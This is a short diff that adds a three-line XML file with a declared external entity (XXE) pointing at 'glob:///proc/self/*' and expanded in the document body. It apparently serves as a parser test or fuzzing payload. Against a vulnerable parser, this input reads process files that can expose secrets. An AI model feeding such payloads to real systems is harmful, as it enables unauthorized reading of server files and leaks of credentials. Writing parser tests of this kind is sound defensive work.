@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "glob:///proc/self/*">]>
+<r><meta name="description" content="ZKR5"/>&xxe;</r>
